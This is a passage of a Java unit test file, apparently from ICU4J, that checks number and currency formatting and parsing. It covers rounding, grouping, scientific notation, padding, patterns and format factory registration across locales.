continue;\n            }\n            String currStr = item.getCurrStr();\n            ParsePosition parsePos = new ParsePosition(0);\n\n            Number numVal = fmt.parse(currStr, parsePos);\n            if ( parsePos.getIndex() != item.getDoubExpectPos() || (numVal != null && numVal.intValue() != item.getDoubExpectVal()) ) {\n                if (numVal != null) {\n                    errln(\"NumberFormat.getCurrencyInstance parse \" + localeString + \"/\" + item.getDescrip() +\n                            \", expect pos/val \" + item.getDoubExpectPos() + \"/\" + item.getDoubExpectVal() +\n                            \", get \" + parsePos.getIndex() + \"/\" + numVal.intValue() );\n                } else {\n                    errln(\"NumberFormat.getCurrencyInstance parse \" + localeString + \"/\" + item.getDescrip() +\n                            \", expect pos/val \" + item.getDoubExpectPos() + \"/\" + item.getDoubExpectVal() +\n                            \", get \" + parsePos.getIndex() + \"/(NULL)\" );\n                }\n            }\n\n            parsePos.setIndex(0);\n            int curExpectPos = item.getCurExpectPos();\n            CurrencyAmount currAmt = fmt.parseCurrency(currStr, parsePos);\n            if ( parsePos.getIndex() != curExpectPos || (currAmt != null && (currAmt.getNumber().intValue() != item.getCurExpectVal() ||\n                    currAmt.getCurrency().getCurrencyCode().compareTo(item.getCurExpectCurr()) != 0)) ) {\n                if (currAmt != null) {\n                    errln(\"NumberFormat.getCurrencyInstance parseCurrency \" + localeString + \"/\" + item.getDescrip() +\n                            \", expect pos/val/curr \" + curExpectPos + \"/\" + item.getCurExpectVal() + \"/\" + item.getCurExpectCurr() +\n                            \", get \" + parsePos.getIndex() + \"/\" + currAmt.getNumber().intValue() + \"/\" + currAmt.getCurrency().getCurrencyCode() );\n                } else {\n                    errln(\"NumberFormat.getCurrencyInstance parseCurrency \" + localeString + \"/\" + item.getDescrip() +\n                            \", expect pos/val/curr \" + curExpectPos + \"/\" + item.getCurExpectVal() + \"/\" + item.getCurExpectCurr() +\n                            \", get \" + parsePos.getIndex() + \"/(NULL)\" );\n                }\n            }\n        }\n    }\n\n    @Test\n    public void TestParseCurrencyWithWhitespace() {\n        DecimalFormat df = new DecimalFormat(\"#,##0.00 ¤¤\");\n        ParsePosition ppos = new ParsePosition(0);\n        df.parseCurrency(\"1.00 us denmark\", ppos);\n        assertEquals(\"Expected to fail on 'us denmark' string\", 4, ppos.getErrorIndex());\n    }\n\n    @Test\n    public void TestParseCurrPatternWithDecStyle() {\n        String currpat = \"¤#,##0.00\";\n        String parsetxt = \"x0y$\";\n        DecimalFormat decfmt = (DecimalFormat)NumberFormat.getInstance(new ULocale(\"en_US\"), NumberFormat.NUMBERSTYLE);\n        decfmt.applyPattern(currpat);\n        ParsePosition ppos = new ParsePosition(0);\n        Number value = decfmt.parse(parsetxt, ppos);\n        if (ppos.getIndex() != 0) {\n            errln(\"DecimalFormat.parse expected to fail but got ppos \" + ppos.getIndex() + \", value \" + value);\n        }\n    }\n\n    /**\n     * Test the Currency object handling, new as of ICU 2.2.\n     */\n    @Test\n    public void TestCurrencyObject() {\n        NumberFormat fmt =\n                NumberFormat.getCurrencyInstance(Locale.US);\n\n        expectCurrency(fmt, null, 1234.56, \"$1,234.56\");\n\n        expectCurrency(fmt, Currency.getInstance(Locale.FRANCE),\n                1234.56, \"\\u20AC1,234.56\"); // Euro\n\n        expectCurrency(fmt, Currency.getInstance(Locale.JAPAN),\n                1234.56, \"\\u00A51,235\"); // Yen\n\n        expectCurrency(fmt, Currency.getInstance(new Locale(\"fr\", \"CH\", \"\")),\n                1234.56, \"CHF 1,234.56\"); // no more 0.05 rounding here, see cldrbug 5548\n\n        expectCurrency(fmt, Currency.getInstance(Locale.US),\n                1234.56, \"$1,234.56\");\n\n        fmt = NumberFormat.getCurrencyInstance(Locale.FRANCE);\n\n        expectCurrency(fmt, null, 1234.56, \"1\\u202F234,56 \\u20AC\");\n\n        expectCurrency(fmt, Currency.getInstance(Locale.JAPAN),\n                1234.56, \"1\\u202F235 JPY\"); // Yen\n\n        expectCurrency(fmt, Currency.getInstance(new Locale(\"fr\", \"CH\", \"\")),\n                1234.56, \"1\\u202F234,56 CHF\"); // no more rounding here, see cldrbug 5548\n\n        expectCurrency(fmt, Currency.getInstance(Locale.US),\n                1234.56, \"1\\u202F234,56 $US\");\n\n        expectCurrency(fmt, Currency.getInstance(Locale.FRANCE),\n                1234.56, \"1\\u202F234,56 \\u20AC\"); // Euro\n    }\n\n    @Test\n    public void TestCompatibleCurrencies() {\n        NumberFormat fmt =\n                NumberFormat.getCurrencyInstance(Locale.US);\n        expectParseCurrency(fmt, Currency.getInstance(Locale.JAPAN), \"\\u00A51,235\"); // Yen half-width\n        expectParseCurrency(fmt, Currency.getInstance(Locale.JAPAN), \"\\uFFE51,235\"); // Yen full-wdith\n    }\n\n    @Test\n    public void TestCurrencyPatterns() {\n        int i;\n        Random rnd = new Random(2017);\n        Locale[] locs = NumberFormat.getAvailableLocales();\n        for (i=0; i<locs.length; ++i) {\n            if (rnd.nextDouble() < 0.9) {\n                // Check a random subset for speed:\n                // Otherwise, this test takes a large fraction of the entire time.\n                continue;\n            }\n            NumberFormat nf = NumberFormat.getCurrencyInstance(locs[i]);\n            // Make sure currency formats do not have a variable number\n            // of fraction digits\n            int min = nf.getMinimumFractionDigits();\n            int max = nf.getMaximumFractionDigits();\n            if (min != max) {\n                String a = nf.format(1.0);\n                String b = nf.format(1.125);\n                errln(\"FAIL: \" + locs[i] +\n                        \" min fraction digits != max fraction digits; \"+\n                        \"x 1.0 => \" + a +\n                        \"; x 1.125 => \" + b);\n            }\n\n            // Make sure EURO currency formats have exactly 2 fraction digits\n            if (nf instanceof DecimalFormat) {\n                Currency curr = ((DecimalFormat) nf).getCurrency();\n                if (curr != null && \"EUR\".equals(curr.getCurrencyCode())) {\n                    if (min != 2 || max != 2) {\n                        String a = nf.format(1.0);\n                        errln(\"FAIL: \" + locs[i] +\n                                \" is a EURO format but it does not have 2 fraction digits; \"+\n                                \"x 1.0 => \" +\n                                a);\n                    }\n                }\n            }\n        }\n    }\n\n    /**\n     * Do rudimentary testing of parsing.\n     */\n    @Test\n    public void TestParse() {\n        String arg = \"0.0\";\n        DecimalFormat format = new DecimalFormat(\"00\");\n        double aNumber = 0l;\n        try {\n            aNumber = format.parse(arg).doubleValue();\n        } catch (ParseException e) {\n            System.out.println(e);\n        }\n        logln(\"parse(\" + arg + \") = \" + aNumber);\n    }\n\n    /**\n     * Test proper rounding by the format method.\n     */\n    @Test\n    public void TestRounding487() {\n\n        NumberFormat nf = NumberFormat.getInstance();\n        roundingTest(nf, 0.00159999, 4, \"0.0016\");\n        roundingTest(nf, 0.00995, 4, \"0.01\");\n\n        roundingTest(nf, 12.3995, 3, \"12.4\");\n\n        roundingTest(nf, 12.4999, 0, \"12\");\n        roundingTest(nf, - 19.5, 0, \"-20\");\n\n    }\n\n    /**\n     * Test the functioning of the secondary grouping value.\n     */\n    @Test\n    public void TestSecondaryGrouping() {\n\n        DecimalFormatSymbols US = new DecimalFormatSymbols(Locale.US);\n        DecimalFormat f = new DecimalFormat(\"#,##,###\", US);\n\n        expect(f, 123456789L, \"12,34,56,789\");\n        expectPat(f, \"#,##,##0\");\n        f.applyPattern(\"#,###\");\n\n        f.setSecondaryGroupingSize(4);\n        expect(f, 123456789L, \"12,3456,789\");\n        expectPat(f, \"#,####,##0\");\n        NumberFormat g = NumberFormat.getInstance(new Locale(\"hi\", \"IN\"));\n\n        String out = \"\";\n        long l = 1876543210L;\n        out = g.format(l);\n\n        // expect \"1,87,65,43,210\", but with Hindi digits\n        //         01234567890123\n        boolean ok = true;\n        if (out.length() != 14) {\n            ok = false;\n        } else {\n            for (int i = 0; i < out.length(); ++i) {\n                boolean expectGroup = false;\n                switch (i) {\n                case 1 :\n                case 4 :\n                case 7 :\n                case 10 :\n                    expectGroup = true;\n                    break;\n                }\n                // Later -- fix this to get the actual grouping\n                // character from the resource bundle.\n                boolean isGroup = (out.charAt(i) == 0x002C);\n                if (isGroup != expectGroup) {\n                    ok = false;\n                    break;\n                }\n            }\n        }\n        if (!ok) {\n            errln(\"FAIL  Expected \"+ l + \" x hi_IN . \\\"1,87,65,43,210\\\" (with Hindi digits), got \\\"\"\n                    + out + \"\\\"\");\n        } else {\n            logln(\"Ok    \" + l + \" x hi_IN . \\\"\" + out + \"\\\"\");\n        }\n    }\n\n    /*\n     * Internal test utility.\n     */\n    private void roundingTest(NumberFormat nf, double x, int maxFractionDigits, final String expected) {\n        nf.setMaximumFractionDigits(maxFractionDigits);\n        String out = nf.format(x);\n        logln(x + \" formats with \" + maxFractionDigits + \" fractional digits to \" + out);\n        if (!out.equals(expected))\n            errln(\"FAIL: Expected \" + expected);\n    }\n\n    /**\n     * Upgrade to alphaWorks\n     */\n    @Test\n    public void TestExponent() {\n        DecimalFormatSymbols US = new DecimalFormatSymbols(Locale.US);\n        DecimalFormat fmt1 = new DecimalFormat(\"0.###E0\", US);\n        DecimalFormat fmt2 = new DecimalFormat(\"0.###E+0\", US);\n        int n = 1234;\n        expect2(fmt1, n, \"1.234E3\");\n        expect2(fmt2, n, \"1.234E+3\");\n        expect(fmt1, \"1.234E+3\", n); // Either format should parse \"E+3\"\n\n    }\n\n    /**\n     * Upgrade to alphaWorks\n     */\n    @Test\n    public void TestScientific() {\n\n        DecimalFormatSymbols US = new DecimalFormatSymbols(Locale.US);\n\n        // Test pattern round-trip\n        final String PAT[] = { \"#E0\", \"0.####E0\", \"00.000E00\", \"##0.####E000\", \"0.###E0;[0.###E0]\" };\n        int PAT_length = PAT.length;\n        int DIGITS[] = {\n                // min int, max int, min frac, max frac\n                0, 1, 0, 0, // \"#E0\"\n                1, 1, 0, 4, // \"0.####E0\"\n                2, 2, 3, 3, // \"00.000E00\"\n                1, 3, 0, 4, // \"##0.####E000\"\n                1, 1, 0, 3, // \"0.###E0;[0.###E0]\"\n        };\n        for (int i = 0; i < PAT_length; ++i) {\n            String pat = PAT[i];\n            DecimalFormat df = new DecimalFormat(pat, US);\n            String pat2 = df.toPattern();\n            if (pat.equals(pat2)) {\n                logln(\"Ok   Pattern rt \\\"\" + pat + \"\\\" . \\\"\" + pat2 + \"\\\"\");\n            } else {\n                errln(\"FAIL Pattern rt \\\"\" + pat + \"\\\" . \\\"\" + pat2 + \"\\\"\");\n            }\n            // Make sure digit counts match what we expect\n            if (i == 0) continue; // outputs to 1,1,0,0 since at least one min digit is required.\n            if (df.getMinimumIntegerDigits() != DIGITS[4 * i]\n                    || df.getMaximumIntegerDigits() != DIGITS[4 * i + 1]\n                            || df.getMinimumFractionDigits() != DIGITS[4 * i + 2]\n                                    || df.getMaximumFractionDigits() != DIGITS[4 * i + 3]) {\n                errln(\"FAIL \\\"\"+ pat+ \"\\\" min/max int; min/max frac = \"\n                        + df.getMinimumIntegerDigits() + \"/\"\n                        + df.getMaximumIntegerDigits() + \";\"\n                        + df.getMinimumFractionDigits() + \"/\"\n                        + df.getMaximumFractionDigits() + \", expect \"\n                        + DIGITS[4 * i] + \"/\"\n                        + DIGITS[4 * i + 1] + \";\"\n                        + DIGITS[4 * i + 2] + \"/\"\n                        + DIGITS[4 * i + 3]);\n            }\n        }\n\n        expect2(new DecimalFormat(\"#E0\", US), 12345.0, \"1.2345E4\");\n        expect(new DecimalFormat(\"0E0\", US), 12345.0, \"1E4\");\n\n        // pattern of NumberFormat.getScientificInstance(Locale.US) = \"0.######E0\" not \"#E0\"\n        // so result = 1.234568E4 not 1.2345678901E4\n        //when the pattern problem is finalized, delete comment mark'//'\n        //of the following code\n        expect2(NumberFormat.getScientificInstance(Locale.US), 12345.678901, \"1.2345678901E4\");\n        logln(\"Testing NumberFormat.getScientificInstance(ULocale) ...\");\n        expect2(NumberFormat.getScientificInstance(ULocale.US), 12345.678901, \"1.2345678901E4\");\n\n        expect(new DecimalFormat(\"##0.###E0\", US), 12345.0, \"12.34E3\");\n        expect(new DecimalFormat(\"##0.###E0\", US), 12345.00001, \"12.35E3\");\n        expect2(new DecimalFormat(\"##0.####E0\", US), 12345, \"12.345E3\");\n\n        // pattern of NumberFormat.getScientificInstance(Locale.US) = \"0.######E0\" not \"#E0\"\n        // so result = 1.234568E4 not 1.2345678901E4\n        expect2(NumberFormat.getScientificInstance(Locale.FRANCE), 12345.678901, \"1,2345678901E4\");\n        logln(\"Testing NumberFormat.getScientificInstance(ULocale) ...\");\n        expect2(NumberFormat.getScientificInstance(ULocale.FRANCE), 12345.678901, \"1,2345678901E4\");\n\n        expect(new DecimalFormat(\"##0.####E0\", US), 789.12345e-9, \"789.12E-9\");\n        expect2(new DecimalFormat(\"##0.####E0\", US), 780.e-9, \"780E-9\");\n        expect(new DecimalFormat(\".###E0\", US), 45678.0, \".457E5\");\n        expect2(new DecimalFormat(\".###E0\", US), 0, \".0E0\");\n        /*\n        expect(new DecimalFormat[] { new DecimalFormat(\"#E0\", US),\n                                     new DecimalFormat(\"##E0\", US),\n                                     new DecimalFormat(\"####E0\", US),\n                                     new DecimalFormat(\"0E0\", US),\n                                     new DecimalFormat(\"00E0\", US),\n                                     new DecimalFormat(\"000E0\", US),\n                                   },\n               new Long(45678000),\n               new String[] { \"4.5678E7\",\n                              \"45.678E6\",\n                              \"4567.8E4\",\n                              \"5E7\",\n                              \"46E6\",\n                              \"457E5\",\n                            }\n               );\n        !\n        ! Unroll this test into individual tests below...\n        !\n         */\n        expect2(new DecimalFormat(\"#E0\", US), 45678000, \"4.5678E7\");\n        expect2(new DecimalFormat(\"##E0\", US), 45678000, \"45.678E6\");\n        expect2(new DecimalFormat(\"####E0\", US), 45678000, \"4567.8E4\");\n        expect(new DecimalFormat(\"0E0\", US), 45678000, \"5E7\");\n        expect(new DecimalFormat(\"00E0\", US), 45678000, \"46E6\");\n        expect(new DecimalFormat(\"000E0\", US), 45678000, \"457E5\");\n        /*\n        expect(new DecimalFormat(\"###E0\", US, status),\n               new Object[] { new Double(0.0000123), \"12.3E-6\",\n                              new Double(0.000123), \"123E-6\",\n                              new Double(0.00123), \"1.23E-3\",\n                              new Double(0.0123), \"12.3E-3\",\n                              new Double(0.123), \"123E-3\",\n                              new Double(1.23), \"1.23E0\",\n                              new Double(12.3), \"12.3E0\",\n                              new Double(123), \"123E0\",\n                              new Double(1230), \"1.23E3\",\n                             });\n        !\n        ! Unroll this test into individual tests below...\n        !\n         */\n        expect2(new DecimalFormat(\"###E0\", US), 0.0000123, \"12.3E-6\");\n        expect2(new DecimalFormat(\"###E0\", US), 0.000123, \"123E-6\");\n        expect2(new DecimalFormat(\"###E0\", US), 0.00123, \"1.23E-3\");\n        expect2(new DecimalFormat(\"###E0\", US), 0.0123, \"12.3E-3\");\n        expect2(new DecimalFormat(\"###E0\", US), 0.123, \"123E-3\");\n        expect2(new DecimalFormat(\"###E0\", US), 1.23, \"1.23E0\");\n        expect2(new DecimalFormat(\"###E0\", US), 12.3, \"12.3E0\");\n        expect2(new DecimalFormat(\"###E0\", US), 123.0, \"123E0\");\n        expect2(new DecimalFormat(\"###E0\", US), 1230.0, \"1.23E3\");\n        /*\n        expect(new DecimalFormat(\"0.#E+00\", US, status),\n               new Object[] { new Double(0.00012), \"1.2E-04\",\n                              new Long(12000),     \"1.2E+04\",\n                             });\n        !\n        ! Unroll this test into individual tests below...\n        !\n         */\n        expect2(new DecimalFormat(\"0.#E+00\", US), 0.00012, \"1.2E-04\");\n        expect2(new DecimalFormat(\"0.#E+00\", US), 12000, \"1.2E+04\");\n    }\n\n    /**\n     * Upgrade to alphaWorks\n     */\n    @Test\n    public void TestPad() {\n\n        DecimalFormatSymbols US = new DecimalFormatSymbols(Locale.US);\n        expect2(new DecimalFormat(\"*^##.##\", US), 0, \"^^^^0\");\n        expect2(new DecimalFormat(\"*^##.##\", US), -1.3, \"^-1.3\");\n        expect2(\n                new DecimalFormat(\"##0.0####E0*_ 'g-m/s^2'\", US),\n                0,\n                \"0.0E0______ g-m/s^2\");\n        expect(\n                new DecimalFormat(\"##0.0####E0*_ 'g-m/s^2'\", US),\n                1.0 / 3,\n                \"333.333E-3_ g-m/s^2\");\n        expect2(new DecimalFormat(\"##0.0####*_ 'g-m/s^2'\", US), 0, \"0.0______ g-m/s^2\");\n        expect(\n                new DecimalFormat(\"##0.0####*_ 'g-m/s^2'\", US),\n                1.0 / 3,\n                \"0.33333__ g-m/s^2\");\n\n        // Test padding before a sign\n        final String formatStr = \"*x#,###,###,##0.0#;*x(###,###,##0.0#)\";\n        expect2(new DecimalFormat(formatStr, US), -10, \"xxxxxxxxxx(10.0)\");\n        expect2(new DecimalFormat(formatStr, US), -1000, \"xxxxxxx(1,000.0)\");\n        expect2(new DecimalFormat(formatStr, US), -1000000, \"xxx(1,000,000.0)\");\n        expect2(new DecimalFormat(formatStr, US), -100.37, \"xxxxxxxx(100.37)\");\n        expect2(new DecimalFormat(formatStr, US), -10456.37, \"xxxxx(10,456.37)\");\n        expect2(new DecimalFormat(formatStr, US), -1120456.37, \"xx(1,120,456.37)\");\n        expect2(new DecimalFormat(formatStr, US), -112045600.37, \"(112,045,600.37)\");\n        expect2(new DecimalFormat(formatStr, US), -1252045600.37, \"(1,252,045,600.37)\");\n\n        expect2(new DecimalFormat(formatStr, US), 10, \"xxxxxxxxxxxx10.0\");\n        expect2(new DecimalFormat(formatStr, US), 1000, \"xxxxxxxxx1,000.0\");\n        expect2(new DecimalFormat(formatStr, US), 1000000, \"xxxxx1,000,000.0\");\n        expect2(new DecimalFormat(formatStr, US), 100.37, \"xxxxxxxxxx100.37\");\n        expect2(new DecimalFormat(formatStr, US), 10456.37, \"xxxxxxx10,456.37\");\n        expect2(new DecimalFormat(formatStr, US), 1120456.37, \"xxxx1,120,456.37\");\n        expect2(new DecimalFormat(formatStr, US), 112045600.37, \"xx112,045,600.37\");\n        expect2(new DecimalFormat(formatStr, US), 10252045600.37, \"10,252,045,600.37\");\n\n        // Test padding between a sign and a number\n        final String formatStr2 = \"#,###,###,##0.0#*x;(###,###,##0.0#*x)\";\n        expect2(new DecimalFormat(formatStr2, US), -10, \"(10.0xxxxxxxxxx)\");\n        expect2(new DecimalFormat(formatStr2, US), -1000, \"(1,000.0xxxxxxx)\");\n        expect2(new DecimalFormat(formatStr2, US), -1000000, \"(1,000,000.0xxx)\");\n        expect2(new DecimalFormat(formatStr2, US), -100.37, \"(100.37xxxxxxxx)\");\n        expect2(new DecimalFormat(formatStr2, US), -10456.37, \"(10,456.37xxxxx)\");\n        expect2(new DecimalFormat(formatStr2, US), -1120456.37, \"(1,120,456.37xx)\");\n        expect2(new DecimalFormat(formatStr2, US), -112045600.37, \"(112,045,600.37)\");\n        expect2(new DecimalFormat(formatStr2, US), -1252045600.37, \"(1,252,045,600.37)\");\n\n        expect2(new DecimalFormat(formatStr2, US), 10, \"10.0xxxxxxxxxxxx\");\n        expect2(new DecimalFormat(formatStr2, US), 1000, \"1,000.0xxxxxxxxx\");\n        expect2(new DecimalFormat(formatStr2, US), 1000000, \"1,000,000.0xxxxx\");\n        expect2(new DecimalFormat(formatStr2, US), 100.37, \"100.37xxxxxxxxxx\");\n        expect2(new DecimalFormat(formatStr2, US), 10456.37, \"10,456.37xxxxxxx\");\n        expect2(new DecimalFormat(formatStr2, US), 1120456.37, \"1,120,456.37xxxx\");\n        expect2(new DecimalFormat(formatStr2, US), 112045600.37, \"112,045,600.37xx\");\n        expect2(new DecimalFormat(formatStr2, US), 10252045600.37, \"10,252,045,600.37\");\n\n        //testing the setPadCharacter(UnicodeString) and getPadCharacterString()\n        DecimalFormat fmt = new DecimalFormat(\"#\", US);\n        char padString = 'P';\n        fmt.setPadCharacter(padString);\n        expectPad(fmt, \"*P##.##\", DecimalFormat.PAD_BEFORE_PREFIX, 5, padString);\n        fmt.setPadCharacter('^');\n        expectPad(fmt, \"*^#\", DecimalFormat.PAD_BEFORE_PREFIX, 1, '^');\n        //commented untill implementation is complete\n        /*  fmt.setPadCharacter((UnicodeString)\"^^^\");\n          expectPad(fmt, \"*^^^#\", DecimalFormat.kPadBeforePrefix, 3, (UnicodeString)\"^^^\");\n          padString.remove();\n          padString.append((UChar)0x0061);\n          padString.append((UChar)0x0302);\n          fmt.setPadCharacter(padString);\n          UChar patternChars[]={0x002a, 0x0061, 0x0302, 0x0061, 0x0302, 0x0023, 0x0000};\n          UnicodeString pattern(patternChars);\n          expectPad(fmt, pattern , DecimalFormat.kPadBeforePrefix, 4, padString);\n         */\n\n        // Test multi-char padding sequence specified via pattern\n        expect2(new DecimalFormat(\"*'😃'####.00\", US), 1.1, \"😃😃😃1.10\");\n    }\n\n    /**\n     * Upgrade to alphaWorks\n     */\n    @Test\n    public void TestPatterns2() {\n        DecimalFormatSymbols US = new DecimalFormatSymbols(Locale.US);\n        DecimalFormat fmt = new DecimalFormat(\"#\", US);\n\n        char hat = 0x005E; /*^*/\n\n        expectPad(fmt, \"*^#\", DecimalFormat.PAD_BEFORE_PREFIX, 1, hat);\n        expectPad(fmt, \"$*^#\", DecimalFormat.PAD_AFTER_PREFIX, 2, hat);\n        expectPad(fmt, \"#*^\", DecimalFormat.PAD_BEFORE_SUFFIX, 1, hat);\n        expectPad(fmt, \"#$*^\", DecimalFormat.PAD_AFTER_SUFFIX, 2, hat);\n        expectPad(fmt, \"$*^$#\", -1);\n        expectPad(fmt, \"#$*^$\", -1);\n        expectPad(fmt, \"'pre'#,##0*x'post'\", DecimalFormat.PAD_BEFORE_SUFFIX, 12, (char) 0x0078 /*x*/);\n        expectPad(fmt, \"''#0*x\", DecimalFormat.PAD_BEFORE_SUFFIX, 3, (char) 0x0078 /*x*/);\n        expectPad(fmt, \"'I''ll'*a###.##\", DecimalFormat.PAD_AFTER_PREFIX, 10, (char) 0x0061 /*a*/);\n\n        fmt.applyPattern(\"AA#,##0.00ZZ\");\n        fmt.setPadCharacter(hat);\n\n        fmt.setFormatWidth(10);\n\n        fmt.setPadPosition(DecimalFormat.PAD_BEFORE_PREFIX);\n        expectPat(fmt, \"*^AA#,##0.00ZZ\");\n\n        fmt.setPadPosition(DecimalFormat.PAD_BEFORE_SUFFIX);\n        expectPat(fmt, \"AA#,##0.00*^ZZ\");\n\n        fmt.setPadPosition(DecimalFormat.PAD_AFTER_SUFFIX);\n        expectPat(fmt, \"AA#,##0.00ZZ*^\");\n\n        //            12  3456789012\n        String exp = \"AA*^#,##0.00ZZ\";\n        fmt.setFormatWidth(12);\n        fmt.setPadPosition(DecimalFormat.PAD_AFTER_PREFIX);\n        expectPat(fmt, exp);\n\n        fmt.setFormatWidth(13);\n        //              12  34567890123\n        expectPat(fmt, \"AA*^##,##0.00ZZ\");\n\n        fmt.setFormatWidth(14);\n        //              12  345678901234\n        expectPat(fmt, \"AA*^###,##0.00ZZ\");\n\n        fmt.setFormatWidth(15);\n        //              12  3456789012345\n        expectPat(fmt, \"AA*^####,##0.00ZZ\"); // This is the interesting case\n\n        // The new implementation produces \"AA*^#####,##0.00ZZ\", which is functionally equivalent\n        // to what the old implementation produced, \"AA*^#,###,##0.00ZZ\"\n        fmt.setFormatWidth(16);\n        //              12  34567890123456\n        //expectPat(fmt, \"AA*^#,###,##0.00ZZ\");\n        expectPat(fmt, \"AA*^#####,##0.00ZZ\");\n    }\n\n    @Test\n    public void TestRegistration() {\n        final ULocale SRC_LOC = ULocale.FRANCE;\n        final ULocale SWAP_LOC = ULocale.US;\n\n        class TestFactory extends SimpleNumberFormatFactory {\n            NumberFormat currencyStyle;\n\n            TestFactory() {\n                super(SRC_LOC, true);\n                currencyStyle = NumberFormat.getIntegerInstance(SWAP_LOC);\n            }\n\n            @Override\n            public NumberFormat createFormat(ULocale loc, int formatType) {\n                if (formatType == FORMAT_CURRENCY) {\n                    return currencyStyle;\n                }\n                return null;\n            }\n        }\n\n        NumberFormat f0 = NumberFormat.getIntegerInstance(SWAP_LOC);\n        NumberFormat f1 = NumberFormat.getIntegerInstance(SRC_LOC);\n        NumberFormat f2 = NumberFormat.getCurrencyInstance(SRC_LOC);\n        Object key = NumberFormat.registerFactory(new TestFactory());\n        NumberFormat f3 = NumberFormat.getCurrencyInstance(SRC_LOC);\n        NumberFormat f4 = NumberFormat.getIntegerInstance(SRC_LOC);\n        NumberFormat.unregister(key); // restore for other tests\n        NumberFormat f5 = NumberFormat.getCurrencyInstance(SRC_LOC);\n\n        float n = 1234.567f;\n        logln(\"f0 swap int: \" + f0.format(n));\n        logln(\"f1 src int: \" + f1.format(n));\n        logln(\"f2 src cur: \" + f2.format(n));\n        logln(\"f3 reg cur: \" + f3.format(n));\n        logln(\"f4 reg int: \" + f4.format(n));\n        logln(\"f5 unreg cur: \" + f5.format(n));\n\n        if (!f3.format(n).equals(f0.format(n))) {\n            errln(\"registered service did not match\");\n        }\n        if (!f4.format(n).equals(f1.format(n))) {\n            errln(\"registered service did not inherit\");\n        }\n        if (!f5.format(n).equals(f2.format(n))) {\n            errln(\"unregistered service did not match original\");\n        }\n    }\n\n    @Test\n    public void TestScientific2() {\n        // jb 2552\n        DecimalFormat fmt = (DecimalFormat)NumberFormat.getCurrencyInstance();\n        Number num = new Double(12.34);\n        expect(fmt, num, \"$12.34\");\n        fmt.setScientificNotation(true);\n        expect(fmt, num, \"$1.23E1\");\n        fmt.setScientificNotation(false);\n        expect(fmt, num, \"$12.34\");\n    }\n\n    @Test\n    public void TestScientificGrouping() {\n        // jb 2552\n        DecimalFormat fmt = new DecimalFormat(\"###.##E0\");\n        expect(fmt, .01234, \"12.3E-3\");\n        expect(fmt, .1234, \"123E-3\");\n        expect(fmt, 1.234, \"1.23E0\");\n        expect(fmt, 12.34, \"12.3E0\");\n        expect(fmt, 123.4, \"123E0\");\n        expect(fmt, 1234, \"1.23E3\");\n    }\n\n    // additional coverage tests\n\n    // sigh, can't have static inner classes, why not?\n\n    static final class PI extends Number {\n        /**\n         * For serialization\n         */\n        private static final long serialVersionUID = -305601227915602172L;\n\n        private PI() {}\n        @Override\n        public int intValue() { return (int)Math.PI; }\n        @Override\n        public long longValue() { return (long)Math.PI; }\n        @Override\n        public float  floatValue() { return (float)Math.PI; }\n        @Override\n        public double doubleValue() { return Math.PI; }\n        @Override\n        public byte byteValue() { return (byte)Math.PI; }\n        @Override\n        public short shortValue() { return (short)Math.PI; }\n\n        public static final Number INSTANCE = new PI();\n    }\n\n    @Test\n    public void TestCoverage() {\n        NumberFormat fmt = NumberFormat.getNumberInstance(); // default locale\n        logln(fmt.format(new BigInteger(\"1234567890987654321234567890987654321\", 10)));\n\n        fmt = NumberFormat.getScientificInstance(); // default locale\n\n        logln(fmt.format(PI.INSTANCE));\n\n        try {\n            logln(fmt.format(\"12345\"));\n            errln(\"numberformat of string did not throw exception\");\n        }\n        catch (Exception e) {\n            logln(\"PASS: numberformat of string failed as expected\");\n        }\n\n        int hash = fmt.hashCode();\n        logln(\"hash code \" + hash);\n\n        logln(\"compare to string returns: \" + fmt.equals(\"\"));\n\n        // For ICU 2.6 - alan\n        DecimalFormatSymbols US = new DecimalFormatSymbols(Locale.US);\n        DecimalFormat df = new DecimalFormat(\"'*&'' '\\u00A4' ''&*' #,##0.00\", US);\n        df.setCurrency(Currency.getInstance(\"INR\"));\n        expect2(df, 1.0, \"*&' \\u20B9 '&* 1.00\");\n        expect2(df, -2.0, \"-*&' \\u20B9 '&* 2.00\");\n        df.applyPattern(\"#,##0.00 '*&'' '\\u00A4' ''&*'\");\n        expect2(df, 2.0, \"2.00 *&' \\u20B9 '&*\");\n        expect2(df, -1.0, \"-1.00 *&' \\u20B9 '&*\");\n\n        java.math.BigDecimal r;\n\n        r = df.getRoundingIncrement();\n        if (r != null) {\n            errln(\"FAIL: rounding = \" + r + \", expect null\");\n        }\n\n        if (df.isScientificNotation()) {\n            errln(\"FAIL: isScientificNotation = true, expect false\");\n        }\n\n        // Create a new instance to flush out currency info\n        df = new DecimalFormat(\"0.00000\", US);\n        df.setScientificNotation(true);\n        if (!df.isScientificNotation()) {\n            errln(\"FAIL: isScientificNotation = false, expect true\");\n        }\n        df.setMinimumExponentDigits((byte)2);\n        if (df.getMinimumExponentDigits() != 2) {\n            errln(\"FAIL: getMinimumExponentDigits = \" +\n                    df.getMinimumExponentDigits() + \", expect 2\");\n        }\n        df.setExponentSignAlwaysShown(true);\n        if (!df.isExponentSignAlwaysShown()) {\n            errln(\"FAIL: isExponentSignAlwaysShown = false, expect true\");\n        }\n        df.setSecondaryGroupingSize(0);\n        if (df.getSecondaryGroupingSize() != 0) {\n            errln(\"FAIL: getSecondaryGroupingSize = \" +\n                    df.getSecondaryGroupingSize() + \", expect 0\");\n        }\n        expect2(df, 3.14159, \"3.14159E+00\");\n\n        // DecimalFormatSymbols#getInstance\n        DecimalFormatSymbols decsym1 = DecimalFormatSymbols.getInstance();\n        DecimalFormatSymbols decsym2 = new DecimalFormatSymbols();\n        if (!decsym1.equals(decsym2)) {\n            errln(\"FAIL: DecimalFormatSymbols returned by getInstance()\" +\n                    \"does not match new DecimalFormatSymbols().\");\n        }\n        decsym1 = DecimalFormatSymbols.getInstance(Locale.JAPAN);\n        decsym2 = DecimalFormatSymbols.getInstance(ULocale.JAPAN);\n        if (!decsym1.equals(decsym2)) {\n            errln(\"FAIL: DecimalFormatSymbols returned by getInstance(Locale.JAPAN)\" +\n                    \"does not match the one returned by getInstance(ULocale.JAPAN).\");\n        }\n\n        // DecimalFormatSymbols#getAvailableLocales/#getAvailableULocales\n        Locale[] allLocales = DecimalFormatSymbols.getAvailableLocales();\n        if (allLocales.length == 0) {\n            errln(\"FAIL: Got a empty list for DecimalFormatSymbols.getAvailableLocales\");\n        } else {\n            logln(\"PASS: \" + allLocales.length +\n                    \" available locales returned by DecimalFormatSymbols.getAvailableLocales\");\n        }\n        ULocale[] allULocales = DecimalFormatSymbols.getAvailableULocales();\n        if (allULocales.length == 0) {\n            errln(\"FAIL: Got a empty list for 